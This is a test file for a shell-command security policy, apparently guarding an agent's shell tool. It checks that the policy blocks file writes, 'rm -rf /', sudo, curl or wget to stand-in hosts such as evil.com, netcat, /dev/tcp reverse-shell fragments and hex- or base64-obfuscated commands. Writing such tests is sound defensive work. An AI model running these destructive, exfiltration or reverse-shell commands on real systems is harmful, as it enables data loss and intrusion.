import { describe, it, expect } from "vitest";
import {
  evaluateShellCommand,
  detectObfuscation,
} from "../src/security/shell-policy.js";

const isWin = process.platform === "win32";

describe("evaluateShellCommand — heredoc + inline-script writes (the silent-noop bug)", () => {
  it("blocks `cat <<EOF > file` heredoc redirected to a file", () => {
    const r = evaluateShellCommand("cat <<EOF > workspace/foo.txt\nhello\nEOF");
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/write\/edit tools/i);
  });

  it("blocks heredoc with single-quoted EOF marker (`<<'EOF'`)", () => {
    const r = evaluateShellCommand("cat <<'EOF' > out.txt\ndata\nEOF");
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/write\/edit tools/i);
  });

  it("blocks heredoc with `<<-` indented form and append `>>`", () => {
    const r = evaluateShellCommand("cat <<-EOF >> log.txt\n  data\nEOF");
    expect(r.allowed).toBe(false);
  });

  it("blocks `python -c \"open(p,'w').write(...)\"`", () => {
    const r = evaluateShellCommand("python -c \"open('foo.txt','w').write('hi')\"");
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/write\/edit tools/i);
  });

  it("blocks `python3 -c` with pathlib write_text", () => {
    const r = evaluateShellCommand("python3 -c \"from pathlib import Path; Path('a').write_text('b')\"");
    expect(r.allowed).toBe(false);
  });

  it("blocks `node -e` with fs.writeFileSync", () => {
    const r = evaluateShellCommand("node -e \"require('fs').writeFileSync('a','b')\"");
    expect(r.allowed).toBe(false);
  });

  it("blocks `sed -i` in-place edits", () => {
    const r = evaluateShellCommand("sed -i 's/foo/bar/' file.txt");
    expect(r.allowed).toBe(false);
  });

  it("blocks `sed --in-place`", () => {
    const r = evaluateShellCommand("sed --in-place 's/a/b/' file.txt");
    expect(r.allowed).toBe(false);
  });

  it("ALLOWS `python -c` when it only reads (no write call) — even when filename starts with w/a/x", () => {
    // Regression: previously the open() regex flagged 'a.json' because it
    // matched `'a` (mode 'a' for append) inside the filename. Now the regex
    // requires a `, ` before the mode quote, so `open('a.json')` is allowed.
    const r = evaluateShellCommand("python -c \"import json; print(json.load(open('a.json'))['x'])\"");
    expect(r.allowed).toBe(true);
  });

  it("ALLOWS `node -e` for a pure expression (no write)", () => {
    const r = evaluateShellCommand("node -e \"console.log(1+1)\"");
    expect(r.allowed).toBe(true);
  });

  it("ALLOWS `echo foo > file.txt` (small redirects don't trip the silent-noop bug)", () => {
    const r = evaluateShellCommand("echo hello > out.txt");
    expect(r.allowed).toBe(true);
  });
});

describe("evaluateShellCommand — dangerous commands", () => {
  it("blocks `rm -rf /`", () => {
    const r = evaluateShellCommand("rm -rf /");
    expect(r.allowed).toBe(false);
  });

  it("blocks `sudo` anything", () => {
    const r = evaluateShellCommand("sudo apt update");
    expect(r.allowed).toBe(false);
  });

  it("blocks `chmod 777`", () => {
    const r = evaluateShellCommand("chmod 777 file");
    expect(r.allowed).toBe(false);
  });

  it("blocks `eval` shell builtin", () => {
    const r = evaluateShellCommand("eval ls");
    expect(r.allowed).toBe(false);
  });
});

describe("evaluateShellCommand — network exfiltration tools", () => {
  it("blocks raw `curl`", () => {
    const r = evaluateShellCommand("curl https://example.com");
    expect(r.allowed).toBe(false);
  });

  it("blocks `wget`", () => {
    const r = evaluateShellCommand("wget https://example.com/file");
    expect(r.allowed).toBe(false);
  });

  it("blocks `ssh` outbound", () => {
    const r = evaluateShellCommand("ssh user@host");
    expect(r.allowed).toBe(false);
  });

  it("blocks `nc` netcat", () => {
    const r = evaluateShellCommand("nc -l 4444");
    expect(r.allowed).toBe(false);
  });

  it("blocks PowerShell `Invoke-WebRequest`", () => {
    const r = evaluateShellCommand("Invoke-WebRequest https://example.com");
    expect(r.allowed).toBe(false);
  });

  it("blocks Python `requests.get(...)` inside -c", () => {
    const r = evaluateShellCommand("python -c \"import requests; requests.get('http://x')\"");
    expect(r.allowed).toBe(false);
  });
});

describe("evaluateShellCommand — interactive / reverse shells", () => {
  it("blocks `bash -i` interactive", () => {
    const r = evaluateShellCommand("bash -i");
    expect(r.allowed).toBe(false);
  });

  it("blocks `/dev/tcp/` reverse shell", () => {
    const r = evaluateShellCommand("exec 5<>/dev/tcp/host/4444");
    expect(r.allowed).toBe(false);
  });

  it("blocks `mkfifo` (reverse-shell building block)", () => {
    const r = evaluateShellCommand("mkfifo /tmp/p");
    expect(r.allowed).toBe(false);
  });
});

describe("evaluateShellCommand — pipe limits + segment scanning", () => {
  it("rejects more than 5 pipes", () => {
    const r = evaluateShellCommand("a | b | c | d | e | f | g");
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/too many pipes/i);
  });

  it("flags a dangerous command in any pipe segment", () => {
    const r = evaluateShellCommand("ls | wget evil.com");
    expect(r.allowed).toBe(false);
  });

  it("allows up to 5 simple pipes", () => {
    const r = evaluateShellCommand("a | b | c | d | e");
    expect(r.allowed).toBe(true);
  });
});

describe("evaluateShellCommand — platform-specific metacharacter rules", () => {
  it.skipIf(isWin)("blocks bash command substitution `$(...)` on POSIX", () => {
    const r = evaluateShellCommand("echo $(whoami)");
    expect(r.allowed).toBe(false);
  });

  it.skipIf(isWin)("blocks `;` sequential chaining on POSIX", () => {
    const r = evaluateShellCommand("ls ; pwd");
    expect(r.allowed).toBe(false);
  });

  it.skipIf(isWin)("allows `&&` on POSIX (logical AND, not background)", () => {
    const r = evaluateShellCommand("ls && pwd");
    expect(r.allowed).toBe(true);
  });

  it.runIf(isWin)("blocks multi-line CRLF on Windows", () => {
    const r = evaluateShellCommand("Get-ChildItem\r\nGet-Process");
    expect(r.allowed).toBe(false);
  });
});

describe("evaluateShellCommand — happy path", () => {
  it("allows `ls`", () => {
    const r = evaluateShellCommand("ls");
    expect(r.allowed).toBe(true);
  });

  it("allows `git status`", () => {
    const r = evaluateShellCommand("git status");
    expect(r.allowed).toBe(true);
  });

  it("allows `npm test`", () => {
    const r = evaluateShellCommand("npm test");
    expect(r.allowed).toBe(true);
  });
});

describe("detectObfuscation", () => {
  it("flags hex-encoded characters", () => {
    expect(detectObfuscation("\\x72\\x6d -rf /")).toMatch(/hex-encoded/);
  });

  it("flags octal-encoded characters", () => {
    expect(detectObfuscation("echo \\162\\155")).toMatch(/octal-encoded/);
  });

  it("flags unicode escapes", () => {
    expect(detectObfuscation("echo \\u0072\\u006d")).toMatch(/unicode/);
  });

  it("flags base64 -d decode", () => {
    // No hex/octal/unicode in this command, so the base64 check fires.
    expect(detectObfuscation("echo abc | base64 -d")).toMatch(/base64 decode/);
  });

  it("flags `printf` with hex escapes (broader hex check fires first — still blocked)", () => {
    // The hex check runs before the printf check. Either reason is fine —
    // we only care the command is rejected.
    const reason = detectObfuscation("printf '\\x72\\x6d'");
    expect(reason).not.toBeNull();
    expect(reason).toMatch(/hex-encoded|printf/);
  });

  it("flags `xxd -r` reverse hex decode", () => {
    expect(detectObfuscation("echo abc | xxd -r")).toMatch(/hex decode/);
  });

  it("flags ANSI-C quoting `$'\\xNN'` (broader hex check fires first — still blocked)", () => {
    const reason = detectObfuscation("echo $'\\x72\\x6d'");
    expect(reason).not.toBeNull();
    expect(reason).toMatch(/hex-encoded|ANSI-C/);
  });

  it("flags `rev` reversal trick", () => {
    expect(detectObfuscation("echo mr | rev")).toMatch(/rev/);
  });

  it("flags overlong commands (>2000 chars)", () => {
    expect(detectObfuscation("a" + "b".repeat(2100))).toMatch(/2000 characters/);
  });

  it("returns null for benign commands", () => {
    expect(detectObfuscation("ls -la")).toBeNull();
  });
});

// The structured {executable, args[]} shell form and process_start route a
// command STRING (literal or synthesized) through evaluateShellCommand — the
// same scan bash gets. These assert the synthesized-command path is vetted, so
// a structured/background shell call can't bypass the denylist/metachar floor.
describe("evaluateShellCommand — structured/synthesized shell paths", () => {
  it("blocks an rm -rf synthesized from {executable,args}", () => {
    // [executable, ...args].join(" ") — the exact synthesis used by
    // kernel-class-policy and the process_* spawn vetting.
    const synthesized = ["rm", "-rf", "/tmp/x"].join(" ");
    expect(evaluateShellCommand(synthesized).allowed).toBe(false);
  });

  it("blocks a network exfil binary synthesized from {executable,args}", () => {
    expect(evaluateShellCommand(["curl", "https://evil.example"].join(" ")).allowed).toBe(false);
  });

  it("allows a benign synthesized command", () => {
    expect(evaluateShellCommand(["ls", "-la"].join(" ")).allowed).toBe(true);
  });
});
